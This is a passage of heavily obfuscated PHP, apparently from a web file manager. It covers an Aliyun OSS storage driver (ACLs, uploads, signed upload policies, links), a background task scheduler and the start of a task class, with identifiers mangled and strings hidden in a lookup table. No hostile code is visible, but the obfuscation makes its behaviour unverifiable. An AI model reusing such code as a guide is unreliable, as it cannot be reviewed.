$_SERVER[Ù×¯Ø…]; $¤¨İÕÜ = $this->pathAcl($‘ÙÄõ÷); return $¤¨İÕÜ == $ŠÆ‹”ÊÜ[1332] || $¤¨İÕÜ == $ŠÆ‹”ÊÜ[553] ? !0 : !1; } public function canWrite($´•¨ ¨é) { $·×Ğˆœ¿ = $this->pathAcl($´•¨ ¨é); return $·×Ğˆœ¿ == $_SERVER[Ù×¯Ø…][553] ? !0 : !1; } public function pathAcl($ÒÜ¿äÙ´) { $ÖÁ¶×­ =& $_SERVER[Ù×¯Ø…]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¼ò±öÚß = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÒÜ¿äÙ´)); } catch (OSS\Core\OssException $º´ÎÆüÅ) { return !1; } $æßßû§• = $¼ò±öÚß == $ÖÁ¶×­[34] ? $this->bucketAcl : $¼ò±öÚß; if ($æßßû§• == $ÖÁ¶×­[1333]) { return $ÖÁ¶×­[1332]; } if ($æßßû§• == $ÖÁ¶×­[1334]) { return $ÖÁ¶×­[553]; } return $æßßû§•; } private function chmodPath($¶âúñğú, $º¼ƒò„ = '') { $¶Š«›Ç° =& $_SERVER[Ù×¯Ø…]; $°»»ò = empty($º¼ƒò„) ? $¶Š«›Ç°[1334] : $º¼ƒò„; $Ğ›Í‡  = array($¶Š«›Ç°[34], $¶Š«›Ç°[192], $¶Š«›Ç°[1333], $¶Š«›Ç°[1334]); if (!in_array($°»»ò, $Ğ›Í‡ )) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¶âúñğú), $°»»ò); } catch (OSS\Core\OssException $ ªŒ¢ù¿) { return !1; } return !0; } public function getContent($Š˜ ¶èÑ) { return $this->fileSubstr($Š˜ ¶èÑ, -1); } public function setContent($ƒ•—¸á®, $¬şä¬­ = '') { $¸óŒ¶ã =& $_SERVER[Ù×¯Ø…]; try { $çô¹é¾‰ = $this->trafficLimit($¸óŒ¶ã[1335]); $›¢å” = $this->client->putObject($this->bucket, $this->pathEncode($ƒ•—¸á®), $¬şä¬­, $çô¹é¾‰); } catch (OSS\Core\OssException $”Óœ¨­÷) { return !1; } $£õõÅø = array($¸óŒ¶ã[1325] => trim($›¢å”[$¸óŒ¶ã[1336]], $¸óŒ¶ã[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ƒ•—¸á®))); $this->updateObjMeta($ƒ•—¸á®, $£õõÅø); return isset($›¢å”[$¸óŒ¶ã[1337]][$¸óŒ¶ã[1284]]) ? !0 : !1; } private function updateObjMeta($ƒàºÒÖ¦, $ÃÌÃÙÃ˜) { $ƒàºÒÖ¦ = $this->pathEncode($ƒàºÒÖ¦); try { $®Ì¸÷º  = array(OSS\OssClient::OSS_HEADERS => $ÃÌÃÙÃ˜); $this->client->copyObject($this->bucket, $ƒàºÒÖ¦, $this->bucket, $ƒàºÒÖ¦, $®Ì¸÷º ); } catch (OSS\Core\OssException $È˜¹½êñ) { return !1; } return !0; } public function upload($øçŸ³å, $ûÏè’øô, $‚ê‡õÍ = false, $œî„Á­¼ = REPEAT_REPLACE) { $ò«ûÑóÒ =& $_SERVER[Ù×¯Ø…]; $¡¸È¼„ = trim($øçŸ³å, $ò«ûÑóÒ[8]); $¸üÈõº’ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ò«ûÑóÒ[1325] => @md5_file($ûÏè’øô)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($øçŸ³å))); $¸üÈõº’ = $this->trafficLimit($ò«ûÑóÒ[1335], $¸üÈõº’); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¡¸È¼„), $ûÏè’øô, $¸üÈõº’); } catch (OSS\Core\OssException $Ù¨¨Òì­) { return !1; } return $this->getPathOuter($øçŸ³å); } public function getHost() { $Ó¿˜‘ƒ =& $_SERVER[Ù×¯Ø…]; $½Ü®Ü‚ = explode($Ó¿˜‘ƒ[177], parent::getHost()); return $½Ü®Ü‚[0] . $Ó¿˜‘ƒ[177] . $this->bucket . $Ó¿˜‘ƒ[95] . $½Ü®Ü‚[1]; } public function uploadFormData($€ÔäÜàÎ, $ŸŠ¶˜˜˜ = 3600) { $·ÊÚäïû =& $_SERVER[Ù×¯Ø…]; if (!($°ú‘Æ‡• = $this->getHost())) { return !1; } $ğş¡ï¹ï = $ŸŠ¶˜˜˜; $¹ºÌ„êæ = date($·ÊÚäïû[1338], time() + $ğş¡ï¹ï); $›š»‹»Ç = new DateTime($¹ºÌ„êæ); $ú¯òà—î = $›š»‹»Ç->format(DateTime::ISO8601); $ªÄö£Šã = strpos($ú¯òà—î, $·ÊÚäïû[294]); $ú¯òà—î = substr($ú¯òà—î, 0, $ªÄö£Šã) . $·ÊÚäïû[1339]; $úòë‡è = 1048576000 * 5; $¶½–Ğ–á = $this->pathFather($€ÔäÜàÎ); $¶ñ½°ÌÜ = array($·ÊÚäïû[1238] => $ú¯òà—î, $·ÊÚäïû[1239] => array(array($·ÊÚäïû[1340], 0, $úòë‡è), array($·ÊÚäïû[1242], $·ÊÚäïû[1243], $¶½–Ğ–á))); $ÈŒüäÀ = base64_encode(json_encode($¶ñ½°ÌÜ)); $˜Æ«£–¬ = base64_encode(hash_hmac($·ÊÚäïû[230], $ÈŒüäÀ, $this->secret, !0)); $Ó¾»·¶¯ = array($·ÊÚäïû[1248] => $ÈŒüäÀ, $·ÊÚäïû[1341] => $this->accessKey, $·ÊÚäïû[1244] => $·ÊÚäïû[1236], $·ÊÚäïû[1342] => $˜Æ«£–¬, $·ÊÚäïû[175] => $°ú‘Æ‡•); $Ó¾»·¶¯ = $this->trafficLimit($·ÊÚäïû[1335], $Ó¾»·¶¯); return $Ó¾»·¶¯; } public function multiUploadFormData($™‰âùãÄ, $®È‹ä×ï = 3600) { $©üÏŠ„ =& $_SERVER[Ù×¯Ø…]; if (!($åæè = $this->getHost())) { return !1; } $ïÜˆİÂ“ = $this->trafficLimit($©üÏŠ„[1335]); $ï´ ¾ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($™‰âùãÄ), $ïÜˆİÂ“); return array($©üÏŠ„[221] => $ï´ ¾, $©üÏŠ„[175] => $åæè . $©üÏŠ„[8] . $this->pathEncode($™‰âùãÄ), $©üÏŠ„[222] => gmdate($©üÏŠ„[1343]), $©üÏŠ„[93] => $™‰âùãÄ); } public function multiUploadAuthData($Êõâˆ®, $î‰—Æ—¢ = array()) { $ËŞÆÃÇ¦ =& $_SERVER[Ù×¯Ø…]; $İŞ²Æ¦» = isset($î‰—Æ—¢[$ËŞÆÃÇ¦[222]]) ? $î‰—Æ—¢[$ËŞÆÃÇ¦[222]] : gmdate($ËŞÆÃÇ¦[1343]); $¡—çŞÖ˜ = isset($î‰—Æ—¢[$ËŞÆÃÇ¦[168]]) ? $î‰—Æ—¢[$ËŞÆÃÇ¦[168]] : $ËŞÆÃÇ¦[33]; $¿´íŸ² = $Êõâˆ®; if (isset($î‰—Æ—¢[$ËŞÆÃÇ¦[93]])) { $¿´íŸ² = $î‰—Æ—¢[$ËŞÆÃÇ¦[93]]; unset($î‰—Æ—¢[$ËŞÆÃÇ¦[93]]); } if (isset($î‰—Æ—¢[$ËŞÆÃÇ¦[223]])) { $î‰—Æ—¢[$ËŞÆÃÇ¦[222]] = $İŞ²Æ¦»; return $this->listUploadParts($¿´íŸ², $î‰—Æ—¢); } $Òğşê¼Î = array($ËŞÆÃÇ¦[224], $ËŞÆÃÇ¦[33], $ËŞÆÃÇ¦[119], $İŞ²Æ¦», "\x78\55\157\x73\163\55\x64\141\x74\x65\72{$İŞ²Æ¦»}", $ËŞÆÃÇ¦[8] . $this->bucket . $ËŞÆÃÇ¦[8] . $¿´íŸ² . $¡—çŞÖ˜); if (strpos($¡—çŞÖ˜, $ËŞÆÃÇ¦[225]) === 0) { $Òğşê¼Î[0] = $ËŞÆÃÇ¦[226]; if ($«ƒ§˜ = $this->trafficLimit($ËŞÆÃÇ¦[1335])) { $¿´íŸ² = $ËŞÆÃÇ¦[1344]; array_splice($Òğşê¼Î, 5, 0, $¿´íŸ² . $ËŞÆÃÇ¦[4] . $«ƒ§˜[$¿´íŸ²]); } } if (isset($î‰—Æ—¢[$ËŞÆÃÇ¦[227]]) && $î‰—Æ—¢[$ËŞÆÃÇ¦[227]] == $ËŞÆÃÇ¦[228]) { $Òğşê¼Î[0] = $ËŞÆÃÇ¦[228]; } if (!empty($î‰—Æ—¢[$ËŞÆÃÇ¦[1345]])) { $—¹å¡¼ = array_merge(array($Òğşê¼Î[4]), $î‰—Æ—¢[$ËŞÆÃÇ¦[1345]]); sort($—¹å¡¼); $Òğşê¼Î[4] = implode($ËŞÆÃÇ¦[229], $—¹å¡¼); } $º‘€ÃÁ¼ = implode($ËŞÆÃÇ¦[229], $Òğşê¼Î); $‡¶Ì˜Æù = base64_encode(hash_hmac($ËŞÆÃÇ¦[230], $º‘€ÃÁ¼, $this->secret, !0)); $ø Œ¢×½ = $ËŞÆÃÇ¦[1309] . $this->accessKey . $ËŞÆÃÇ¦[4] . $‡¶Ì˜Æù; if (strpos($¡—çŞÖ˜, $ËŞÆÃÇ¦[225]) === 0) { $ø Œ¢×½ = array($ËŞÆÃÇ¦[232] => $ø Œ¢×½, $ËŞÆÃÇ¦[222] => $İŞ²Æ¦»); if ($«ƒ§˜) { $ø Œ¢×½ = array_merge($ø Œ¢×½, $«ƒ§˜); } } return $ø Œ¢×½; } public function listUploadParts($çñ”®¤, $­ö”Ô›Ù) { $İéÄ¸ì =& $_SERVER[Ù×¯Ø…]; $¾Çğı = parse_url_query($­ö”Ô›Ù[$İéÄ¸ì[168]]); $ Ö„¢öÇ = $this->client->listParts($this->bucket, $this->pathEncode($çñ”®¤), $¾Çğı[$İéÄ¸ì[221]]); $Íè¼½·é = $ Ö„¢öÇ->getListPart(); $ÂÛ·îçş = array(); foreach ($Íè¼½·é as $’êöĞˆ‡) { $ÂÛ·îçş[] = array($İéÄ¸ì[1329] => $’êöĞˆ‡->getPartNumber(), $İéÄ¸ì[1330] => trim($’êöĞˆ‡->getETag(), $İéÄ¸ì[116])); } unset($­ö”Ô›Ù[$İéÄ¸ì[223]], $­ö”Ô›Ù[$İéÄ¸ì[227]]); $ğ´ÕêÛø = $this->multiUploadAuthData($çñ”®¤, $­ö”Ô›Ù); if (empty($ğ´ÕêÛø)) { return !1; } return array($İéÄ¸ì[232] => $ğ´ÕêÛø, $İéÄ¸ì[222] => $­ö”Ô›Ù[$İéÄ¸ì[222]], $İéÄ¸ì[234] => $ÂÛ·îçş); } public function download($Óê£ğ³Ÿ, $Æ¡ší¬) { if ($this->isFolder($Óê£ğ³Ÿ)) { return !1; } try { $ŸÇ¨“›† = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Æ¡ší¬); $ŸÇ¨“›† = $this->trafficLimit($_SERVER[Ù×¯Ø…][109], $ŸÇ¨“›†); $this->client->getObject($this->bucket, $this->pathEncode($Óê£ğ³Ÿ), $ŸÇ¨“›†); } catch (OSS\Core\OssException $Øë Ñ¼õ) { return !1; } return $Æ¡ší¬; } public function fileSubstr($Î–øæóõ, $³àÄù·½ = 0, $âúÉï¡ = false) { if ($³àÄù·½ === -1) { $ï°ÒõÖ“ = array(); } else { if ($âúÉï¡ === !1) { $¦áüùÌ¨ = $this->size($Î–øæóõ); } else { $¦áüùÌ¨ = $³àÄù·½ + $âúÉï¡ - 1; } $ï°ÒõÖ“ = array(OSS\OssClient::OSS_RANGE => "{$³àÄù·½}\55{$¦áüùÌ¨}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Î–øæóõ), $ï°ÒõÖ“); } catch (OSS\Core\OssException $û¶ê ®ô) { think_exception($û¶ê ®ô->getMessage()); return !1; } } private function trafficLimit($ŠÄ€ù, $Ì…Óß¬¤ = array()) { $¦ÆÓöê =& $_SERVER[Ù×¯Ø…]; if ($ŠÄ€ù == $¦ÆÓöê[1335] && $this->isUploadServer() || $ŠÄ€ù == $¦ÆÓöê[109] && $this->isFileOutServer()) { return $Ì…Óß¬¤; } $§àøÈ˜ = floatval($GLOBALS[$¦ÆÓöê[6]][$¦ÆÓöê[88]][$¦ÆÓöê[107]][$ŠÄ€ù]) * 1024 * 1024 * 8; if (!$§àøÈ˜) { return $Ì…Óß¬¤; } $§àøÈ˜ = $§àøÈ˜ < 819200 ? 819200 : ($§àøÈ˜ > 838860800 ? 838860800 : $§àøÈ˜); $Ì…Óß¬¤[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($§àøÈ˜); return $Ì…Óß¬¤; } public function link($¥‚‹êöã, $’Ô´–‚À = array()) { $—²¦²Ù³ =& $_SERVER[Ù×¯Ø…]; if (!$this->exist($¥‚‹êöã) || $this->isFolder($¥‚‹êöã)) { return !1; } try { $’Ô´–‚À = $this->trafficLimit($—²¦²Ù³[109], $’Ô´–‚À); $æŠÊĞ¼ = $this->client->signUrl($this->bucket, $this->pathEncode($¥‚‹êöã), 3600 * 12, $—²¦²Ù³[228], $’Ô´–‚À); return $this->getCdnLink($æŠÊĞ¼); } catch (OSS\Core\OssException $‰²ÓÃÎ) { return !1; } } public function fileOut($«œ¼«­§, $£„×‘‹µ = false, $ï·üá = false, $˜“í“¾Ô = '') { $ÌŸ¢İ« =& $_SERVER[Ù×¯Ø…]; if ($this->isFileOutServer()) { return $this->fileOutServer($«œ¼«­§, $£„×‘‹µ, $ï·üá, $˜“í“¾Ô); } if (!$ï·üá) { $ï·üá = $this->pathThis($«œ¼«­§); } $ï·üá = rawurlencode($ï·üá); $ùÂÆ² = get_file_mime(get_path_ext($ï·üá)); if ($ùÂÆ² == $ÌŸ¢İ«[213]) { return parent::fileOut($«œ¼«­§, $£„×‘‹µ, $ï·üá, $˜“í“¾Ô); } $£„×‘‹µ = $£„×‘‹µ ? $ÌŸ¢İ«[214] : $ÌŸ¢İ«[215]; $ŠÏš÷ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÌŸ¢İ«[1346] . rawurlencode("{$£„×‘‹µ}\x3b\x66\x69\x6c\x65\x6e\x61\x6d\145\75{$ï·üá}")); $ŠÏš÷[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÌŸ¢İ«[1347] . rawurlencode($ùÂÆ²); $Û« Õó¹ = $this->link($«œ¼«­§, $ŠÏš÷); $this->fileOutLink($Û« Õó¹); } public function fileOutServer($°Å¡ÜÚñ, $´é€•ë‡ = false, $ãñÛÒ¢Ù = false, $ñ×İ‘úŠ = '') { parent::fileOut($°Å¡ÜÚñ, $´é€•ë‡, $ãñÛÒ¢Ù, $ñ×İ‘úŠ); } public function fileOutImage($ïè„õ™–, $´µ£Ù‡ = 250) { $•œïÛ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ù×¯Ø…][1348] . $´µ£Ù‡); $ö³È¿¢ã = $this->link($ïè„õ™–, $•œïÛ); $this->fileOutLink($ö³È¿¢ã); } public function fileOutImageServer($æ’¤Š“¶, $ÕåÔòŸû = 250) { parent::fileOutImage($æ’¤Š“¶, $ÕåÔòŸû); } public function fileOutLink($ªÑŸ÷ê—) { $ÒÑò¾‚ş =& $_SERVER[Ù×¯Ø…]; if (!$this->isCdnHost() && substr($ªÑŸ÷ê—, 0, 7) == $ÒÑò¾‚ş[1251]) { $ªÑŸ÷ê— = $ÒÑò¾‚ş[1252] . substr($ªÑŸ÷ê—, 7); } header($ÒÑò¾‚ş[159] . $ªÑŸ÷ê—); die; } public function hashMd5($½Œ¹ˆÂ™, $Õ«©îûÓ = '') { $Ú¹¦‚·Ú =& $_SERVER[Ù×¯Ø…]; $›é«ß§Î = $this->_objectMeta($½Œ¹ˆÂ™); if (!$›é«ß§Î) { return $Ú¹¦‚·Ú[33]; } if (!isset($›é«ß§Î[$Ú¹¦‚·Ú[1325]]) && !empty($Õ«©îûÓ)) { $İ€ïìÁÚ = $this->updateObjMeta($½Œ¹ˆÂ™, array($Ú¹¦‚·Ú[1325] => $Õ«©îûÓ)); $›é«ß§Î[$Ú¹¦‚·Ú[1325]] = $İ€ïìÁÚ ? $Õ«©îûÓ : $Ú¹¦‚·Ú[33]; } return isset($›é«ß§Î[$Ú¹¦‚·Ú[1325]]) ? strtolower($›é«ß§Î[$Ú¹¦‚·Ú[1325]]) : $Ú¹¦‚·Ú[33]; } public function size($œÃ¾ìÚ) { $åÙè¡œ = $this->objectMeta($œÃ¾ìÚ); return $åÙè¡œ ? $åÙè¡œ[$_SERVER[Ù×¯Ø…][78]] : 0; } public function info($©Ğ¼÷¢Á) { if ($this->isFolder($©Ğ¼÷¢Á)) { return $this->folderInfo($©Ğ¼÷¢Á); } else { if ($this->isFile($©Ğ¼÷¢Á)) { return $this->fileInfo($©Ğ¼÷¢Á); } } return !1; } public function exist($÷Æ†Ú·) { return $this->isFile($÷Æ†Ú·) || $this->isFolder($÷Æ†Ú·); } public function isFile($¼Ğï¸ÙÃ) { return !$this->isFolder($¼Ğï¸ÙÃ) && $this->objectMeta($¼Ğï¸ÙÃ); } public function isFolder($æÏèïÔô) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][199], $æÏèïÔô); } protected function objectMeta($÷äŒ”æÔ) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][200], $÷äŒ”æÔ); } protected function _objectMeta($Ê¯–ÜÁ«) { $ù¦„íç… =& $_SERVER[Ù×¯Ø…]; try { $¤Å†Âñ³ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ê¯–ÜÁ«)); } catch (OSS\Core\OssException $¦Ö«—í) { $¤Å†Âñ³ = !1; } if ($¤Å†Âñ³) { $¤Å†Âñ³[$ù¦„íç…[78]] = intval($¤Å†Âñ³[$ù¦„íç…[1323]]); } return $¤Å†Âñ³; } protected function _isFolder($¥‡î¯í±) { $‚¢öŸ‹õ =& $_SERVER[Ù×¯Ø…]; if ($¥‡î¯í± == $‚¢öŸ‹õ[33] || $¥‡î¯í± == $‚¢öŸ‹õ[8]) { return !0; } $³…Ñı—Æ = array($‚¢öŸ‹õ[1319] => $‚¢öŸ‹õ[8], $‚¢öŸ‹õ[1320] => rtrim($¥‡î¯í±, $‚¢öŸ‹õ[8]) . $‚¢öŸ‹õ[8], $‚¢öŸ‹õ[1321] => 1, $‚¢öŸ‹õ[1322] => $‚¢öŸ‹õ[33]); $ØèÔ¾ıÁ = $this->client->listObjects($this->bucket, $³…Ñı—Æ); if ($ØèÔ¾ıÁ->getObjectList() || $ØèÔ¾ıÁ->getPrefixList()) { return !0; } return !1; } } goto CíˆÚ‚ÈÔ ; A£¤Ï‘ Í¾: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÚË¶‚Ó¥ =& $_SERVER[Ù×¯Ø…]; if (self::valueGet($ÚË¶‚Ó¥[749]) != $ÚË¶‚Ó¥[87]) { return; } if (self::valueGet($ÚË¶‚Ó¥[1540]) == $ÚË¶‚Ó¥[87]) { $ÔªÍµ®“ = self::valueGet($ÚË¶‚Ó¥[1541]); if (time() - $ÔªÍµ®“ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($ÚË¶‚Ó¥[1540], $ÚË¶‚Ó¥[87]); self::log($ÚË¶‚Ó¥[1542]); Hook::bind($ÚË¶‚Ó¥[1543], $ÚË¶‚Ó¥[1544]); $‡âÏ¹ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÚË¶‚Ó¥[749]) != $ÚË¶‚Ó¥[87]) { self::valueSet($ÚË¶‚Ó¥[1540], $ÚË¶‚Ó¥[191]); self::log($ÚË¶‚Ó¥[1545]); die; } $Ù™¿“Æ÷ = time(); if ($Ù™¿“Æ÷ - $‡âÏ¹ >= 60) { self::valueSet(array($ÚË¶‚Ó¥[1540] => $ÚË¶‚Ó¥[87], $ÚË¶‚Ó¥[1541] => $Ù™¿“Æ÷), !1); $‡âÏ¹ = $Ù™¿“Æ÷; } if (!file_exists(USER_SYSTEM . $ÚË¶‚Ó¥[1546])) { self::valueSet(array($ÚË¶‚Ó¥[1540] => $ÚË¶‚Ó¥[191], $ÚË¶‚Ó¥[749] => $ÚË¶‚Ó¥[191]), !1); self::log($ÚË¶‚Ó¥[1547]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ì€ğŸ” =& $_SERVER[Ù×¯Ø…]; http_close(); self::valueSet($ì€ğŸ”[749], $ì€ğŸ”[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ì€ğŸ”[1540] => $ì€ğŸ”[191], $ì€ğŸ”[749] => $ì€ğŸ”[87]), !1); } public static function shutdownEvent() { $«êÙ¼° =& $_SERVER[Ù×¯Ø…]; self::valueSet($«êÙ¼°[1540], $«êÙ¼°[191]); self::log($«êÙ¼°[1548]); } public static function config($´„Î•òÎ, $éó’ïšô) { self::valueSet($_SERVER[Ù×¯Ø…][749], $´„Î•òÎ); } private static function taskRunAll() { $ã÷ñ¼î„ =& $_SERVER[Ù×¯Ø…]; $ÈßÙ½“¬ = timeFloat(); $ü„ÛâÈ¨ = Model($ã÷ñ¼î„[1549])->listData(); $—à®¤öµ = count($ü„ÛâÈ¨); for ($†¢·÷°¬ = 0; $†¢·÷°¬ < $—à®¤öµ; $†¢·÷°¬++) { $Æé·§¼ = $ü„ÛâÈ¨[$†¢·÷°¬]; if (!$Æé·§¼[$ã÷ñ¼î„[395]] || $Æé·§¼[$ã÷ñ¼î„[1550]] != $ã÷ñ¼î„[87]) { continue; } if (!self::taskTimeCheck($Æé·§¼)) { continue; } self::taskRun($Æé·§¼); } Hook::trigger($ã÷ñ¼î„[1551]); self::taskQueueRun($ÈßÙ½“¬); } private static function taskQueueRun($¡¿³¡ÅÊ) { $ò‰ÚÏ‘ = 10; while (!0) { $ğ‘›–Ö¼ = TaskQueue::run(); if ($ğ‘›–Ö¼ === !1) { break; } if (timeFloat() - $¡¿³¡ÅÊ >= $ò‰ÚÏ‘) { break; } } } private static function taskTimeCheck($ŞÍ‘øß) { $ÚÖÅæ¬­ =& $_SERVER[Ù×¯Ø…]; $’¢ÕÓ­÷ = json_decode($ŞÍ‘øß[$ÚÖÅæ¬­[197]], !0); $ÀÍÉå—™ = intval($ŞÍ‘øß[$ÚÖÅæ¬­[1541]]); $–ªÕİ÷£ = strtotime($ÚÖÅæ¬­[1552] . $’¢ÕÓ­÷[$ÚÖÅæ¬­[1553]] . $ÚÖÅæ¬­[1554]) - strtotime($ÚÖÅæ¬­[1555]); $ÖÒãà¥š = time() - strtotime(date($ÚÖÅæ¬­[1556]) . $ÚÖÅæ¬­[1557]); $ÏÁ´İÑç = $ÖÒãà¥š >= $–ªÕİ÷£ && $ÖÒãà¥š <= $–ªÕİ÷£ + 3600; switch ($’¢ÕÓ­÷[$ÚÖÅæ¬­[29]]) { case $ÚÖÅæ¬­[1558]: if (time() - $ÀÍÉå—™ < 3600 * 24 * 30) { return !1; } if ($’¢ÕÓ­÷[$ÚÖÅæ¬­[1558]] == date($ÚÖÅæ¬­[1559]) && $ÏÁ´İÑç) { return !0; } break; case $ÚÖÅæ¬­[1560]: if (time() - $ÀÍÉå—™ < 3600 * 24 * 7) { return !1; } $ïïøØ ä = date($ÚÖÅæ¬­[1561]) == 0 ? 7 : date($ÚÖÅæ¬­[1561]); if ($’¢ÕÓ­÷[$ÚÖÅæ¬­[1560]] == $ïïøØ ä && $ÏÁ´İÑç) { return !0; } break; case $ÚÖÅæ¬­[1553]: if (time() - $ÀÍÉå—™ < 3600 * 24) { return !1; } if ($ÏÁ´İÑç) { return !0; } break; case $ÚÖÅæ¬­[1562]: if (time() - $ÀÍÉå—™ >= floatval($’¢ÕÓ­÷[$ÚÖÅæ¬­[1562]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ô­’é£ =& $_SERVER[Ù×¯Ø…]; static $üàĞ³Ì¾ = 0; $óíˆÕ = 300; if (!$üàĞ³Ì¾) { $üàĞ³Ì¾ = time(); } if (time() - $üàĞ³Ì¾ < $óíˆÕ) { return; } $üàĞ³Ì¾ = time(); $ß¢˜Ç©¨ = Model($Ô­’é£[516])->db($Ô­’é£[33]); if ($ß¢˜Ç©¨) { $ß¢˜Ç©¨->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ô­’é£[1563], $Ô­’é£[1564]); die; } } public static function taskRun($¶êã²ó©) { $£ŸĞ‹«¼ =& $_SERVER[Ù×¯Ø…]; self::log($£ŸĞ‹«¼[1565] . $¶êã²ó©[$£ŸĞ‹«¼[395]] . $£ŸĞ‹«¼[1566] . $¶êã²ó©[$£ŸĞ‹«¼[28]] . $£ŸĞ‹«¼[1567] . $¶êã²ó©[$£ŸĞ‹«¼[1568]]); Model($£ŸĞ‹«¼[1549])->run($¶êã²ó©[$£ŸĞ‹«¼[395]]); $¯–¼¢øÃ = timeFloat(); $Ùü¤¤ßĞ = $£ŸĞ‹«¼[33]; switch ($¶êã²ó©[$£ŸĞ‹«¼[29]]) { case $£ŸĞ‹«¼[305]: $·Í˜‰‚ƒ = url_request($¶êã²ó©[$£ŸĞ‹«¼[1568]], $£ŸĞ‹«¼[228], !1, !1, !1, !1, 10); if ($·Í˜‰‚ƒ[$£ŸĞ‹«¼[749]]) { $Ùü¤¤ßĞ = strlen($·Í˜‰‚ƒ[$£ŸĞ‹«¼[1123]]); } break; case $£ŸĞ‹«¼[227]: $Ùü¤¤ßĞ = Hook::apply($¶êã²ó©[$£ŸĞ‹«¼[1568]]); default: break; } Model($£ŸĞ‹«¼[1569])->add(array($£ŸĞ‹«¼[1570] => $£ŸĞ‹«¼[33], $£ŸĞ‹«¼[1571] => $£ŸĞ‹«¼[191], $£ŸĞ‹«¼[29] => $£ŸĞ‹«¼[1572] . $¶êã²ó©[$£ŸĞ‹«¼[395]], $£ŸĞ‹«¼[1573] => json_encode(array($£ŸĞ‹«¼[28] => $¶êã²ó©[$£ŸĞ‹«¼[28]], $£ŸĞ‹«¼[1574] => timeFloat() - $¯–¼¢øÃ, $£ŸĞ‹«¼[291] => $Ùü¤¤ßĞ)))); $ŠÔê™™… = $Ùü¤¤ßĞ ? $£ŸĞ‹«¼[1575] . $Ùü¤¤ßĞ : $£ŸĞ‹«¼[33]; self::log($£ŸĞ‹«¼[1576] . $¶êã²ó©[$£ŸĞ‹«¼[395]] . $£ŸĞ‹«¼[539] . $ŠÔê™™…); return !0; } private static function valueGet($¡ÀüÏÃ…) { $Æ·ú¤É =& $_SERVER[Ù×¯Ø…]; $Ú•ˆƒïÎ = $Æ·ú¤É[1577]; $ˆœÉÊ®‘ = Model($Æ·ú¤É[436])->get($¡ÀüÏÃ…, $Ú•ˆƒïÎ); if (is_null($ˆœÉÊ®‘)) { Model($Æ·ú¤É[436])->set($Æ·ú¤É[749], $Æ·ú¤É[87], $Ú•ˆƒïÎ); Model($Æ·ú¤É[436])->set($Æ·ú¤É[1540], $Æ·ú¤É[191], $Ú•ˆƒïÎ); $ˆœÉÊ®‘ = Model($Æ·ú¤É[436])->get($¡ÀüÏÃ…, $Ú•ˆƒïÎ); } return $ˆœÉÊ®‘; } private static function valueSet($ºáÁ¬ƒ§, $ñ«™…) { $‘—­Ÿ«– =& $_SERVER[Ù×¯Ø…]; $Ï°è¾­ = $‘—­Ÿ«–[1578]; CacheLock::lock($Ï°è¾­); $ü•‰Åä¿ = Model($‘—­Ÿ«–[436])->set($ºáÁ¬ƒ§, $ñ«™…, $‘—­Ÿ«–[1577]); CacheLock::unlock($Ï°è¾­); return $ü•‰Åä¿; } protected static function log($¹œŠŠ¹©) { write_log($¹œŠŠ¹©, $_SERVER[Ù×¯Ø…][1564]); } private static function cacheClear() { $øíáï½É =& $_SERVER[Ù×¯Ø…]; Cache::clearMemory(Model($øíáï½É[436])->cacheKey($øíáï½É[1577])); Cache::clearMemory(Model($øíáï½É[436])->cacheKey($øíáï½É[1579])); Model($øíáï½É[1549])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\156\x6e\151\156\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($ù¡şÄ˜£, $§ôÔ½ö÷ = '', $á¥ŒÊ® = 0, $ÕõÌÕË© = '') { $êâøĞÒŒ =& $_SERVER[Ù×¯Ø…]; if (self::get($ù¡şÄ˜£)) { return; } $this->task = array($êâøĞÒŒ[395] => $ù¡şÄ˜£, $êâøĞÒŒ[1580] => USER_ID, $êâøĞÒŒ[1479] => $ÕõÌÕË©, $êâøĞÒŒ[29] => $§ôÔ½ö÷, $êâøĞÒŒ[1061] => $êâøĞÒŒ[33], $êâøĞÒŒ[1059] => $á¥ŒÊ®, $êâøĞÒŒ[1581] => 0, $êâøĞÒŒ[1582] => 0, $êâøĞÒŒ[1583] => 0, $êâøĞÒŒ[788] => timeFloat(), $êâøĞÒŒ[787] => 0, $êâøĞÒŒ[1584] => 0, $êâøĞÒŒ[1585] => 0, $êâøĞÒŒ[1586] => 0, $êâøĞÒŒ[749] => $êâøĞÒŒ[1540]); $GLOBALS[$êâøĞÒŒ[1587]] = 1; Hook::bind($êâøĞÒŒ[1543], array($this, $êâøĞÒŒ[1588])); Hook::bind($êâøĞÒŒ[1589], array($this, $êâøĞÒŒ[1590])); $this->startAfter(); Hook::trigger($êâøĞÒŒ[1591], $this->task); $this->task[$êâøĞÒŒ[1584]] = timeFloat(); } public function end() { $Íˆ¤æ± =& $_SERVER[Ù×¯Ø…]; if (!$this->task) { return; } if ($this->task[$Íˆ¤æ±[1584]]) { 